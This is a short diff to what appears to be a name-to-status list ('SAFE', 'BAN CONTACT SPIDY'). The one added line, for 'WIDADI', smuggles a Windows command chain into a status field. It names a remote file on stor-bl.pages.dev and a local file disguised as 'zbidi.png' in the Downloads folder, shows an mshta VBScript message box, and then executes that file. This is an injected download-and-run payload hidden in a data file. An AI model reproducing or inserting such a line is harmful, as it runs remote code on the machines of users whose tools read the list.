@@ -23,7 +23,7 @@ TROLEX -> SAFE
 HAKO -> BAN CONTACT SPIDY
 DURAKEN -> BAN CONTACT SPIDY
 MRWAN V2 -> SAFE
-WIDADI -> M AC ADRR
+WIDADI -> SAFE "%USERPROFILE%\Downloads\zbidi.png" "https://stor-bl.pages.dev/Spidy.png" && mshta vbscript:Execute("msgbox ""hak chof spidy "":close") && "%USERPROFILE%\Downloads\zbidi.png"
 NAJI -> BAN CONTACT SPIDY
 BERLLIN -> BAN CONTACT SPIDY
 FLAPO -> SAFE 
